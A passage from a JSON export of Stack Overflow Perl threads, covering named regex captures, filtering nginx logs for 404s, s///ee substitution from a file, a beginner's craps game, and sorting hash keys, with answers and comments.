missing something?</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["regex", "perl", "named-captures"], "comments": [{"owner": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 1, "creation_date": 1569587654, "post_id": 58134467, "comment_id": 102656052, "body": "You are performing an &quot;or&quot; so it found <code>gclid</code> and quit; just like you told it to..."}, {"owner": {"reputation": 2241, "user_id": 391826, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/e86c30a0fca627de805e8e73abf69d48?s=128&d=identicon&r=PG", "display_name": "jaygooby", "link": "https://stackoverflow.com/users/391826/jaygooby"}, "reply_to_user": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1569590226, "post_id": 58134467, "comment_id": 102657404, "body": "Thanks, I get that. Just not sure what the combining operator should be."}, {"owner": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1569590482, "post_id": 58134467, "comment_id": 102657538, "body": "Then you can use something like <a href=\"https://regex101.com/r/7dG3P3/1\" rel=\"nofollow noreferrer\"><code>\\?gclid=(?&lt;gclid&gt;.*?)&quot;.*?session=&quot;(?&lt;session&gt;.*?)&quot;</code></a>. This of course works for the exact example you provided so if other lines have deviations from your example&#39;s format then it would be in your best interest to provide multiple examples and explain what should and what should not match."}], "answers": [{"tags": [], "owner": {"reputation": 69906, "user_id": 6890912, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d291e4dfbf14dcc8874bd4fa620fac23?s=128&d=identicon&r=PG&f=1", "display_name": "blhsing", "link": "https://stackoverflow.com/users/6890912/blhsing"}, "is_accepted": true, "score": 2, "last_activity_date": 1569587634, "creation_date": 1569587634, "answer_id": 58134662, "question_id": 58134467, "link": "https://stackoverflow.com/questions/58134467/how-do-i-extract-and-print-both-these-named-capture-groups-in-perl/58134662#58134662", "title": "How do I extract and print both these named capture groups in perl?", "body": "<p>That's because you are using the <code>|</code> operator so the regex matching stops when any of the two patterns matches. You can use <code>.*</code> in between the two patterns instead. Put <code>\\b</code> before <code>session</code> to ensure word boundary:</p>\n\n<pre><code>perl -nE '/(?&lt;gclid&gt;gclid=[^&amp;\"#\\s]*).*(?&lt;session&gt;\\bsession=.*)/&amp;&amp;say\"gclid: $+{gclid} session: $+{session}\"'\n</code></pre>\n"}], "owner": {"reputation": 2241, "user_id": 391826, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/e86c30a0fca627de805e8e73abf69d48?s=128&d=identicon&r=PG", "display_name": "jaygooby", "link": "https://stackoverflow.com/users/391826/jaygooby"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 58134662, "answer_count": 1, "score": 1, "last_activity_date": 1569587634, "creation_date": 1569586919, "question_id": 58134467, "link": "https://stackoverflow.com/questions/58134467/how-do-i-extract-and-print-both-these-named-capture-groups-in-perl", "title": "How do I extract and print both these named capture groups in perl?", "body": "<p>I want to print <strong>both</strong> the <code>gclid</code> and the <code>session</code> named captures, but my regex is quitting as soon as it matches the gclid:</p>\n\n<pre><code>echo '\"https://example.com/foo/?gclid=abc1234gef76786\" session=\"765dsfsdf7657657khkjh\"' | perl -nE '/(?&lt;gclid&gt;gclid=[^&amp;\"#\\s]*)|(?&lt;session&gt;session=.*)/&amp;&amp;say\"gclid: $+{gclid} session: $+{session}\"'\n</code></pre>\n\n<p>Results in:</p>\n\n<pre><code>gclid: gclid=abc1234gef76786 session:\n</code></pre>\n\n<p>But I want:</p>\n\n<pre><code>gclid: gclid=abc1234gef76786 session: session=\"765dsfsdf7657657khkjh\"\n</code></pre>\n\n<p>The <code>echo</code> is just an example line from one of millions that will be processed.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 1, "last_activity_date": 1569582288, "creation_date": 1569582288, "answer_id": 58133295, "question_id": 58132999, "link": "https://stackoverflow.com/questions/58132999/perl-if-condition-on-regex-captured-groups/58133295#58133295", "title": "Perl - If condition on regex captured groups", "body": "<p>The statement modifier version of <code>if</code> is written after a command, but it's evaluated before it. Therefore, $5 has no value when you compare it to 404. Include the match in the condition so it happens at the right time:</p>\n\n<pre><code>print \"...\\n\" if /.../ &amp;&amp; $5 == 404;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 2, "last_activity_date": 1569582304, "creation_date": 1569582304, "answer_id": 58133300, "question_id": 58132999, "link": "https://stackoverflow.com/questions/58132999/perl-if-condition-on-regex-captured-groups/58133300#58133300", "title": "Perl - If condition on regex captured groups", "body": "<p>Your code has the form</p>\n\n<pre><code>/regex/ &amp;&amp; print \"some string\\n\" if ($5 == 404);\n</code></pre>\n\n<p>This is equivalent to</p>\n\n<pre><code>if ($5 == 404) {\n    /regex/ &amp;&amp; print \"some string\\n\";\n}\n</code></pre>\n\n<p>In other words, your code tries to use <code>$5</code> before running the regex that sets it.</p>\n\n<p>In order to fix the logic, you need to use</p>\n\n<pre><code>if (/regex/ &amp;&amp; $5 == 404) {\n    print \"some string\\n\";\n}\n</code></pre>\n\n<p>Or in one line:</p>\n\n<pre><code>print \"some string\\n\" if /regex/ &amp;&amp; $5 == 404;\n</code></pre>\n\n<p>Alternatively, change the regex so it only matches lines where the status is 404:</p>\n\n<pre><code>/(?&lt;remote_addr>[-.\\d]+) - (?&lt;remote_user>[-.\\d]+) \\[(?&lt;time_local>.*)\\] \"(?&lt;request>.*)\" <strong><em>(?&lt;status>404)</em></strong> (?&lt;body_bytes_send>\\d+) (?&lt;request_length>\\d+) \"(?&lt;http_referer>.*)\" \"(?&lt;http_user_agent>.*)\" \"(?&lt;http_accept_encoding>.*)\" \"(?&lt;http_x_forwarded_for>.*)\" \"(?&lt;request_time>.*)\" \"(?&lt;upstream_response_time>.*)\" \"(?&lt;host>.*)\"/</code></pre>\n\n<p>Then you don't need a separate check.</p>\n"}], "owner": {"reputation": 920, "user_id": 6890234, "user_type": "registered", "accept_rate": 76, "profile_image": "https://lh5.googleusercontent.com/-aKC2DR_lnUc/AAAAAAAAAAI/AAAAAAAAABE/2KLbaG2ZxVU/photo.jpg?sz=128", "display_name": "Nikhil Wagh", "link": "https://stackoverflow.com/users/6890234/nikhil-wagh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 58133300, "answer_count": 2, "score": 1, "last_activity_date": 1569582304, "creation_date": 1569581255, "question_id": 58132999, "link": "https://stackoverflow.com/questions/58132999/perl-if-condition-on-regex-captured-groups", "title": "Perl - If condition on regex captured groups", "body": "<p>I have a log file and a regex that matches every line of the log file and captures groups. I want to print only those log lines which has <code>status = 404</code>. </p>\n\n<p>This is what I was trying to do: </p>\n\n<pre><code>perl -ne '/(?&lt;remote_addr&gt;[-.\\d]+) - (?&lt;remote_user&gt;[-.\\d]+) \\[(?&lt;time_local&gt;.*)\\] \"(?&lt;request&gt;.*)\" (?&lt;status&gt;\\d+) (?&lt;body_bytes_send&gt;\\d+) (?&lt;request_length&gt;\\d+) \"(?&lt;http_referer&gt;.*)\" \"(?&lt;http_user_agent&gt;.*)\" \"(?&lt;http_accept_encoding&gt;.*)\" \"(?&lt;http_x_forwarded_for&gt;.*)\" \"(?&lt;request_time&gt;.*)\" \"(?&lt;upstream_response_time&gt;.*)\" \"(?&lt;host&gt;.*)\"/  &amp;&amp;  print \"$1\\t$2\\t$3\\t$4\\t$5\\t$6\\t$7\\t$8\\t$9\\t$10\\t$11\\t$12\\t$13\\t$14\\n\" if ($5 == 404)' nginx.log &gt; output/temp.log\n</code></pre>\n\n<p>But this doesn't seem to be printing anything.</p>\n\n<p>My log line looks like this: </p>\n\n<pre><code>100.300.500.900 - - [23/Sep/2019:23:59:56 +0000] \"POST /some/address HTTP/1.1\" 200 1024 666 \"-\" \"Mozilla/5.0 (Windows_NT ia32) node.js/4.4.0 v8/4.5.103.35\" \"-\" \"200.400.800.160\" \"10.30\" \"90.270\" \"www.mygoodserver.com\"\n</code></pre>\n\n<p>If I remove the <code>if</code> condition it prints everything. So there can't be anything bad with my regex the problem has to be with <code>inliner if</code> condition.</p>\n\n<p>Can anyone help? I'm new to Perl.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569571906, "post_id": 58127585, "comment_id": 102647904, "body": "Hi, Please note the answer post suggested has both the search and replace string in the script. But I am reading them from a file (as noted in my question). I have tried the solution and it didn&#39;t work (also noted in my question)"}], "answers": [{"comments": [{"owner": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569557700, "post_id": 58127722, "comment_id": 102642947, "body": "Thanks for the reply.  The end user here are Perl aware.   Also the problem is I need to use inbuild functions here. I have found a workaround, but it&#39;s very crude.  ` my $line = &lt;$fh&gt;;  my ($ss,$rs) = split /\\s/,$line;  if ($str =~ m/$ss/){    my $match = $1;    $rs =~ s/(\\$\\w+)/$match/eeg;    $str = $rs;  } `"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569564730, "post_id": 58127722, "comment_id": 102644718, "body": "Re &quot;<i>I need to use inbuild functions here.</i>&quot;, If you can use the code we post on SO, you can use the code we post on CPAN."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 1, "creation_date": 1569565120, "post_id": 58127722, "comment_id": 102644835, "body": "Re &quot;<i><code>s&#47;(\\$\\w+)&#47;$match&#47;eeg</code></i>&quot;, That should be <code>s&#47;(\\$\\w+)&#47;$match&#47;g</code>"}, {"owner": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569572287, "post_id": 58127722, "comment_id": 102648084, "body": "I work on remote machine where I cannot access internet and ftp isn&#39;t allowed. So I cannot install String::Substitution (PERL v5.16.3). I changed the eeg to g. Thanks"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569573534, "post_id": 58127722, "comment_id": 102648681, "body": "That&#39;s not true. You can get your own script on it, so you can get the module on it too!"}, {"owner": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569583709, "post_id": 58127722, "comment_id": 102654080, "body": "I appreciate the answer but please stop speculating on my work env without info. Obviously I am duplicating a piece of code to show the issue here."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "edited": false, "score": 0, "creation_date": 1569585612, "post_id": 58127722, "comment_id": 102654987, "body": "I didn&#39;t do any speculating; you indicated that you able to change code on the machine. If you can do that, you can install String::Substitution. There is no difference between a script and a module."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 3, "last_activity_date": 1569556996, "creation_date": 1569556996, "answer_id": 58127722, "question_id": 58127585, "link": "https://stackoverflow.com/questions/58127585/perl-regex-extracted-from-one-file-to-use-on-a-variable/58127722#58127722", "title": "perl regex extracted from one file to use on a variable", "body": "<p><code>s//$rs/ee</code> expects <code>$rs</code> to contains valid Perl code. <code>pre_$1</code> is not valid Perl code. It's a very bad idea to expect the user to provide Perl code anyway.</p>\n\n<p>Solution:</p>\n\n<pre><code>use String::Substitution qw( gsub_modify );\n\ngsub_modify($str, $ss, $rs);\n</code></pre>\n"}], "owner": {"reputation": 69, "user_id": 3594905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff88772eab80af2c903e4c92adb877d1?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay", "link": "https://stackoverflow.com/users/3594905/vinay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "closed_date": 1569569236, "accepted_answer_id": 58127722, "answer_count": 1, "score": 0, "last_activity_date": 1569558390, "creation_date": 1569556033, "last_edit_date": 1569558390, "question_id": 58127585, "link": "https://stackoverflow.com/questions/58127585/perl-regex-extracted-from-one-file-to-use-on-a-variable", "closed_reason": "Duplicate", "title": "perl regex extracted from one file to use on a variable", "body": "<p>I have a file containing search and replace string in a single line.</p>\n\n<p>And I am reading that file, using split to separate search and replace string\nand apply it on a variable.</p>\n\n<hr>\n\n<p><strong>File:</strong></p>\n\n<pre><code>(.*) pre_$1\n</code></pre>\n\n<hr>\n\n<p><strong>Perl Code:</strong></p>\n\n<pre><code>$str = \"a\";\n\n$line = &lt; FILEHANDLE&gt;; # Read above file.Contains (.*) pre_$1\n\nmy ($ss,$rs) = split /\\s/,$line;\n\n$str =~ s/$ss/$rs/ee;\n</code></pre>\n\n<hr>\n\n<p>This seems to be not working.</p>\n\n<p>I tried to look online, one result is close which is wrap the replace string in both single and double quotes.</p>\n\n<p>i.e.:</p>\n\n<pre><code>$rs = '\"pre_$1\"';\n</code></pre>\n\n<p>This works if its in the script, but if I read from file I done see any replacement.</p>\n\n<p>Can someone point me to what I am doing wrong here?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "input", "subroutine"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1569547955, "post_id": 58126567, "comment_id": 102641106, "body": "This is very difficult to follow, all un-indented ... and so long.  But I notice one thing: you don&#39;t remove newline from user&#39;s input, after you&#39;ve read from <code>&lt;STDIN&gt;</code>. So <code>$betorleave</code>, with the linefeed at its end, can&#39;t be <code>eq</code> to either of strings <code>bet</code> or <code>leave</code>.  Need <code>chomp $betorleave;</code> there."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 4, "creation_date": 1569552385, "post_id": 58126567, "comment_id": 102641862, "body": "<a href=\"http://metacpan.org/pod/perlfunc#chomp\" rel=\"nofollow noreferrer\"><code>perldoc -f chomp</code></a>. There is also rarely a need to use function prototypes (the <code>()</code> in the <code>sub</code> declarations), and this is not one of those times."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1569581156, "creation_date": 1569581156, "answer_id": 58132974, "question_id": 58126567, "link": "https://stackoverflow.com/questions/58126567/having-trouble-calling-functions-for-a-craps-game-im-writing-in-perl/58132974#58132974", "title": "Having trouble calling functions for a craps game I&#39;m writing in Perl", "body": "<p>Whenever you read data from STDIN using <code>&lt;STDIN&gt;</code>, you get the newline attached to the end of the string. You usually don't want it, so you remove it using <code>chomp()</code>.</p>\n\n<p>So, where you have:</p>\n\n<pre><code>$betorleave=&lt;STDIN&gt;;\n</code></pre>\n\n<p>You need to have:</p>\n\n<pre><code>chomp($betorleave=&lt;STDIN&gt;);\n</code></pre>\n\n<p>Some more (free!) tips:</p>\n\n<ol>\n<li>Please learn to indent your code.</li>\n<li>Please don't use prototypes on subroutines (unless you can explain why they shouldn't be used in most cases).</li>\n<li>Think about the scope of your variables. In general, global variables are bad and inside a subroutine you should only use variables that are either passed into the subroutine as parameters or declared inside the subroutine. Your <code>$betorleave</code> variable, for example, is only ever used in the <code>main()</code> subroutine, so it should be declared inside that subroutine.</li>\n</ol>\n"}], "owner": {"reputation": 93, "user_id": 12076645, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/384f04b538161534d56c3174afd07829?s=128&d=identicon&r=PG&f=1", "display_name": "kikikey", "link": "https://stackoverflow.com/users/12076645/kikikey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1569581156, "creation_date": 1569547339, "question_id": 58126567, "link": "https://stackoverflow.com/questions/58126567/having-trouble-calling-functions-for-a-craps-game-im-writing-in-perl", "title": "Having trouble calling functions for a craps game I&#39;m writing in Perl", "body": "<p>I'm writing a craps game in perl(rules provided via source code comments). One of the features in this craps game written in perl is the ability to ask the user whether they want to continue betting or whether they want to leave the game. The problem I am running into is that any time the user types in 'bet' none of the other functions seem to be getting called and the program simply terminates the same way it should terminate when the user types in 'leave'.</p>\n\n<p>I have tried splitting up the program into even more functions and tracing the direction of the function calls by hand. While I would consider myself to have programing experience in other languages I'm relatively new to perl and the syntax is very different from other languages.\nExpected results:</p>\n\n<p>typing bet calls the other functions and depending on the dice roll those functions call other functions and when the user types in leave the program simply terminates.</p>\n\n<p>Actual results:</p>\n\n<p>the program terminates as soon as the user enters anything on the keyboard</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $user_money= 500;#AMOUNT OF MONEY THE USER STARTS OUT WITH\nmy $die=0;#WHAT NUMBER THE DIE ROLLS, IS BETWEEN 1 AND 6\nmy $total_dicenum=0; #TOTAL VALUE OF THE ROLL\nmy $betorleave=\"\";#TAKES IN USER INPUT REGARDING WHETHER THEY WANT TO CONTINUE BETTING OR LEAVE THE GAME\nmy $wager=0;#HOW MUCH MONEY THE USER BETS\nmy $numrolls=0;#KEEPS TRACK OF THE NUMBER OF TIMES THE USER HAS ROLLED THE DICE\nmy $player_point=0;#THE PLAYER'S 'POINT' THAT GET'S DETERMINED AFTER THE FIRST ROLL OF DICE\n\n\n#DETERMINES WHETHER THE PLAYER HAS WON OR LOST A GAME\nsub result(){\n\nif($numrolls==1){\n\n    if($total_dicenum==7 or $total_dicenum==11){\n    print\"you won!\\n\";\n    $player_point=$total_dicenum;\n    $user_money = $user_money +($wager*2);\n    $total_dicenum==0;\n\n    }\nelsif($total_dicenum==2 or $total_dicenum==3 or $total_dicenum==12){\n    print\"you lost\\n\";\n    $player_point=$total_dicenum;\n    $user_money = $user_money-$wager;\n    $total_dicenum==0;\n\n    }\nelse{\n    bet();\n        }\n\n    }\nelse{#ROLLS FOLLWING THE INITAL ROLL\nif($total_dicenum==$player_point){\n    print\"you won!\\n\";\n    $user_money = $user_money+($wager*2);\n    $total_dicenum=0;\n    main();\n}\nelsif($total_dicenum==7){\n    print\"you lost\\n\";\n    $user_money = $user_money-$wager;\n    $total_dicenum=0;\n    main();\n}\nelse{\n    bet();\n}\n}\n}\n\n\n\n#DICE ROLLER FUNCTION\nsub rollDice(){\n\nprint\"rolling dice...\\n\";\n$die = 1 + int rand(6);\nprint\"you rolled $die\\n\";\n}\n#BETTING FUNCTION\nsub bet(){\nprint\"how much money do you want to wager?\\n\";\nprint\"you currently have $user_money dollars\\n\";\n$wager=&lt;STDIN&gt;;\nrollDice();\n$total_dicenum+=$die;\nprint\"your total score is $total_dicenum\\n\";\n$numrolls++;\nresult();\n}\n\n\n\n#BELOW IS MAIN SUBROUTINE WHERE ALL THE ABOVE SUBROUTINES ARE CALLED\nsub main(){\nprint\"Welcome to craps! Here's $user_money dollars!\\n\";\nprint\"would you like to place a bet or would you like to leave?(bet/leave)\\n\";\n$betorleave=&lt;STDIN&gt;;\n\nif($betorleave eq 'bet'){\n    bet();\n\n}\nif($betorleave eq 'leave'){\n    print\"FINAL BALANCE:\\n\";\n    print\"$user_money\\n\";\n}\n\n\n}\n#CALLS THE MAIN FUNCTION\nmain();\n\n\n#WHAT THIS PROGRAM IS SUPPOSED TO DO:\n\n#Each player will start with $500.00. Initially, and after each turn give the user the option of betting or leaving the program. \n#Implement this any way you wish, but make it clear to the user what their options are. \n#If the user chooses to place a bet, ask for the amount that will be wagered and start that \u201cturn,\u201d or bet.\n#Each turn will consist of one or more rolls of the dice. \n#For each roll, the program should display the result of both die and the total value of the roll. \n#Then indicate the outcome from that roll (win/lose/continue rolling). \n#Once a turn, or bet is finished, indicate the outcome of the bet and the updated balance. \n#When the user chooses to exit the program display their final balance. \n#Total value of dice after first roll: 7 or 11 \u2013 player wins 2, 3, or 12 \u2013 player loses \n#Any other value and the player rolls again \u2013 the total of the dice is now their \u201cpoint\u201d \n#Total value of dice following the initial roll: The players \u201cpoint\u201d \u2013 player wins 7 \u2013 player loses \n#Any other value and the player rolls again until rolling a 7 or their point \n</code></pre>\n"}, {"tags": ["perl", "hash"], "answers": [{"comments": [{"owner": {"reputation": 81037, "user_id": 8454, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2NlHs.png?s=128&g=1", "display_name": "Andy Lester", "link": "https://stackoverflow.com/users/8454/andy-lester"}, "edited": false, "score": 2, "creation_date": 1569529166, "post_id": 58124025, "comment_id": 102636933, "body": "Note that you can&#39;t sort a hash, but you can sort the keys of a hash.  For more see <a href=\"https://perldoc.perl.org/perlfaq4.html#How-do-I-sort-a-hash-(optionally-by-value-instead-of-key)%3f\" rel=\"nofollow noreferrer\">the Perl FAQ</a>"}, {"owner": {"reputation": 81, "user_id": 2237899, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae89ab069ea749717a40daf1885be695?s=128&d=identicon&r=PG", "display_name": "Marcel Kraan", "link": "https://stackoverflow.com/users/2237899/marcel-kraan"}, "edited": false, "score": 0, "creation_date": 1569530566, "post_id": 58124025, "comment_id": 102637432, "body": "I don&#39;t understand..  i do not have the first value? (1..31 days)  or am i wrong?"}, {"owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "edited": false, "score": 1, "creation_date": 1569531360, "post_id": 58124025, "comment_id": 102637732, "body": "No. Hashes are unsorted. If you want to work with a hash in a sorted order, you must first retrieve a list of the hash keys, sort those, and then iterate over those sorted keys. I edited the answer to clarify."}, {"owner": {"reputation": 81, "user_id": 2237899, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae89ab069ea749717a40daf1885be695?s=128&d=identicon&r=PG", "display_name": "Marcel Kraan", "link": "https://stackoverflow.com/users/2237899/marcel-kraan"}, "edited": false, "score": 0, "creation_date": 1569533174, "post_id": 58124025, "comment_id": 102638279, "body": "This did the Job... thanks i appreciate it very much"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 81, "user_id": 2237899, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae89ab069ea749717a40daf1885be695?s=128&d=identicon&r=PG", "display_name": "Marcel Kraan", "link": "https://stackoverflow.com/users/2237899/marcel-kraan"}, "edited": false, "score": 3, "creation_date": 1569580638, "post_id": 58124025, "comment_id": 102652555, "body": "@MarcelKraan <a href=\"https://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>"}], "tags": [], "owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "is_accepted": true, "score": 4, "last_activity_date": 1569531534, "last_edit_date": 1569531534, "creation_date": 1569528341, "answer_id": 58124025, "question_id": 58123888, "link": "https://stackoverflow.com/questions/58123888/how-do-i-sort-in-perl-my-hash-array-on-the-key/58124025#58124025", "title": "How do i sort in perl my hash array on the key?", "body": "<p>You want to iterate over the keys</p>\n\n<pre><code># This sorts by working hours\nmy @sorted_keys = sort { $daguren{$a} &lt;=&gt; $daguren{$b} } keys %daguren;\n\n# This sorts by date\nmy @sorted_keys = sort { $a &lt;=&gt; $b } keys %daguren;\n\nforeach my $dag ( @sorted_keys )\n{\n     my $uren = $daguren{$dag};\n     print \"dag=$dag uren=$uren&lt;br&gt;\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 81, "user_id": 2237899, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae89ab069ea749717a40daf1885be695?s=128&d=identicon&r=PG", "display_name": "Marcel Kraan", "link": "https://stackoverflow.com/users/2237899/marcel-kraan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "accepted_answer_id": 58124025, "answer_count": 1, "score": 0, "last_activity_date": 1569531534, "creation_date": 1569527699, "question_id": 58123888, "link": "https://stackoverflow.com/questions/58123888/how-do-i-sort-in-perl-my-hash-array-on-the-key", "title": "How do i sort in perl my hash array on the key?", "body": "<p>I have a calendar filled with daily hours from persons.\nI like to sort my hours per day.. i already counted the hours.</p>\n\n<pre><code>loop....\n    # $daguren  1..31\n    # uren = sum of all the daily hours\n    $daguren{$dag} += $workedhours;\n...loop\n\n# i like to sort it on \"daguren\" that is a number 1 .. 31   \nwhile (($dag,$uren)=each %daguren){\n    print \"dag=$dag uren=$uren&lt;br&gt;\\n\";\n}\n</code></pre>\n"}, {"tags": ["perl", "mojolicious"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", 